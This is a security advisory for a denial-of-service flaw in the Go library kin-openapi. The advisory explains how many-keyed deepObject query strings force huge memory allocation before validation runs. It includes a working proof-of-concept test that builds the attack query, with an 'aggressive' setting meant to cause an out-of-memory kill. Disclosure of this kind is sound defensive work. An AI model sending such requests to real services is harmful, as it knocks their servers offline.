### Summary

An unauthenticated attacker can force multi-gigabyte heap allocation, and ultimately an out-of-memory (OOM) process kill, by sending a single small HTTP request to any endpoint whose OpenAPI spec declares a `deepObject` query parameter with an object schema whose `additionalProperties` is an array. `openapi3filter` decodes the query string into Go values *before* schema validation runs, and while a per-array sparsity guard bounds the size of any *one* reconstructed array, nothing bounds the *number* of arrays. By supplying many distinct sub-keys — each carrying a large but individually-legal index — the attacker multiplies many independently-capped arrays into an aggregate allocation with no ceiling.

### Details

`deepObject` query parameters are decoded by `buildResObj` in `openapi3filter/req_resp_decoder.go`. When a value is an array, the decoder converts the index→value map into a dense slice via `sliceMapToSlice`.

`sliceMapToSlice` has a per-array sparsity guard (added in v0.142.0 for GHSA-xhj3-7xw9-vr34):

```go
// req_resp_decoder.go
const maxSliceMapToSliceGap = 10000 // line 964

func sliceMapToSlice(m map[string]any) ([]any, error) {
	// ...
	// max+1 is the size of the slice this loop is about to build; bound the
	// gap between what was actually supplied (len(m)) and that size so a
	// single huge index can't force an outsized allocation.
	if gap := max + 1 - len(m); gap > maxSliceMapToSliceGap { // line 990
		return nil, fmt.Errorf("array index %d is too sparse relative to the %d supplied items", max, len(m))
	}
	// ...
}
```

This guard bounds a *single* reconstructed array to `len(m) + maxSliceMapToSliceGap` elements. A request like `filter[k][10000]=x` supplies one element (`len(m) == 1`) with `max == 10000`, so `gap == 10000` — exactly at the limit, and permitted. The array back in `buildResObj` is then materialised with:

```go
resultArr := make([]any /*not 0,*/, len(arr)) // line 1026
for i := range arr {
	r, err := buildResObj(params, mapKeys, strconv.Itoa(i), schema.Value.Items)
	// ...
}
```

So each such array costs `make([]any, 10001)` (~80 KB for the slice header backing array on 64-bit) plus a `buildResObj` recursion for every one of the 10001 slots.

The missing bound is at the object/`additionalProperties` layer. For an object schema whose `additionalProperties` is an array, `buildResObj` iterates over *every* attacker-supplied sub-key and reconstructs a full array for each, with no aggregate cap:

```go
if additPropsSchema != nil {
	// dynamic creation of possibly nested objects
	for k := range objectParams { // line 1057 — unbounded over attacker-controlled keys
		r, err := buildResObj(params, mapKeys, k, additPropsSchema)
		// ...
	}
}
```

`objectParams` is populated directly from the query string, so its key count is bounded only by the request size, not by the schema. Each distinct key `k0, k1, ... kN` produces its own ~10001-element array that individually passes the `maxSliceMapToSliceGap` check. Total allocation is therefore `≈ N × (idx + 1)` element slots plus per-slot recursion overhead — an amount the attacker sets with `N` distinct keys and a per-key index `idx`, both drawn from a few kilobytes of URL.

Crucially, this decoding happens **before** schema validation. The schema's `maxItems` (or any other constraint) is only checked by `ValidateParameter` *after* `buildResObj` has already allocated the reconstructed values, so validation cannot prevent the allocation. A `~1 MB` URL (well within the default `net/http` `Server.MaxHeaderBytes` of 1 MB) fits roughly 45,000 distinct keys at index 10000, forcing tens of gigabytes of allocation and an OOM kill of the server process.

The v0.142.0 fix (GHSA-xhj3-7xw9-vr34) addressed a single sparse array; this variant re-achieves the same OOM by multiplying many independently-legal arrays, and remains exploitable in the latest release (v0.145.0).

### PoC

Add the following test as `openapi3filter/advisory_poc_test.go` and run:

```
go test ./openapi3filter/ -run TestPoCDeepObjectMemoryAmplification -v
```

```go
package openapi3filter_test

import (
	"context"
	"fmt"
	"net/http"
	"os"
	"runtime"
	"strings"
	"testing"

	"github.com/getkin/kin-openapi/openapi3"
	"github.com/getkin/kin-openapi/openapi3filter"
	"github.com/getkin/kin-openapi/routers/gorillamux"
)

const specDeepObjectAddPropsArrays = `
openapi: 3.1.0
info: {title: PoC, version: 1.0.0}
paths:
  /f:
    get:
      parameters:
        - name: filter
          in: query
          style: deepObject
          explode: true
          schema:
            type: object
            additionalProperties:
              type: array
              items: {type: string}
      responses:
        '200': {description: ok}
`

// TestPoCDeepObjectMemoryAmplification shows that a tiny query drives
// disproportionate heap allocation (no aggregate bound across arrays).
// Default magnitude is deliberately modest; set POC_AGGRESSIVE=1 to push
// toward OOM.
func TestPoCDeepObjectMemoryAmplification(t *testing.T) {
	N, idx := 12, 2000 // TUNE so default stays < ~300 MB
	if os.Getenv("POC_AGGRESSIVE") != "" {
		N, idx = 1000, 10000
	}

	loader := openapi3.NewLoader()
	doc, err := loader.LoadFromData([]byte(specDeepObjectAddPropsArrays))
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	if err := doc.Validate(loader.Context); err != nil {
		t.Fatalf("validate: %v", err)
	}
	router, err := gorillamux.NewRouter(doc)
	if err != nil {
		t.Fatalf("router: %v", err)
	}

	var sb strings.Builder
	sb.WriteString("/f?")
	for i := 0; i < N; i++ {
		if i > 0 {
			sb.WriteByte('&')
		}
		fmt.Fprintf(&sb, "filter[k%d][%d]=x", i, idx)
	}
	target := sb.String()

	req, _ := http.NewRequest(http.MethodGet, target, nil)
	route, pathParams, err := router.FindRoute(req)
	if err != nil {
		t.Fatalf("route: %v", err)
	}

	var m0, m1 runtime.MemStats
	runtime.GC()
	runtime.ReadMemStats(&m0)
	_ = openapi3filter.ValidateRequest(context.Background(), &openapi3filter.RequestValidationInput{
		Request: req, PathParams: pathParams, Route: route,
		Options: &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
	})
	runtime.ReadMemStats(&m1)

	allocated := m1.TotalAlloc - m0.TotalAlloc
	ratio := float64(allocated) / float64(len(target))
	t.Logf("query=%d bytes (N=%d idx=%d) -> allocated ≈ %d bytes (%.1f MB), amplification ≈ %.0fx",
		len(target), N, idx, allocated, float64(allocated)/(1024*1024), ratio)
	if ratio > 1000 {
		t.Fatalf("VULNERABLE: %d-byte query allocated %.1f MB (≈%.0fx amplification); scales to OOM",
			len(target), float64(allocated)/(1024*1024), ratio)
	}
}
```

**Observed result** (default, safe magnitude `N=12, idx=2000`):

```
=== RUN   TestPoCDeepObjectMemoryAmplification
    advisory_poc_test.go:87: query=232 bytes (N=12 idx=2000) -> allocated ≈ 126689256 bytes (120.8 MB), amplification ≈ 546074x
    advisory_poc_test.go:90: VULNERABLE: 232-byte query allocated 120.8 MB (≈546074x amplification); scales to OOM
--- FAIL: TestPoCDeepObjectMemoryAmplification (0.27s)
FAIL
```

A **232-byte** query string drives **~120.8 MB** of allocation — an amplification of roughly **546,000x** — while decoding a request that does nothing but decode. The magnitude is deliberately capped for a safe default; setting `POC_AGGRESSIVE=1` (`N=1000, idx=10000`) raises the target toward a genuine OOM. Because cost scales as `≈ N × idx`, a ~1 MB URL (~45,000 keys at index 10000, within the default `Server.MaxHeaderBytes`) reaches tens of gigabytes and an OOM kill.

### Impact

Unauthenticated remote denial of service (memory exhaustion / OOM) against any service that uses `openapi3filter` to validate incoming requests against a spec containing a `deepObject`, `explode: true` query parameter whose schema is an object with an array-typed `additionalProperties` (a common pattern for arbitrary filter maps). A single small request — a few kilobytes — allocates hundreds of megabytes to gigabytes; a request near the default 1 MB header limit can allocate tens of gigabytes and kill the process. No authentication is required and the request superficially conforms to the schema, so it passes routing and reaches the vulnerable decoder before validation runs. Repeated or concurrent requests trivially exhaust host memory.

---

- **Ecosystem:** Go
- **Package:** github.com/getkin/kin-openapi
- **Affected versions:** all released versions up to and including v0.145.0 (the per-array cap added in v0.142.0 does not bound aggregate allocation across arrays)
- **CVSS v3.1:** 7.5 (High) — `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
- **CWE:** CWE-770 (Allocation of Resources Without Limits or Throttling); also CWE-400 (Uncontrolled Resource Consumption), CWE-789 (Memory Allocation with Excessive Size Value)
- **Advisory relationship:** Relates to GHSA-xhj3-7xw9-vr34 ("uncontrolled resource consumption in deepObject query decoding", patched in v0.142.0). That fix bounds a single sparse array via `maxSliceMapToSliceGap`; this variant re-achieves the OOM by multiplying many independently-legal arrays through the unbounded `additionalProperties` loop, with no aggregate bound — still exploitable in the latest release (v0.145.0).
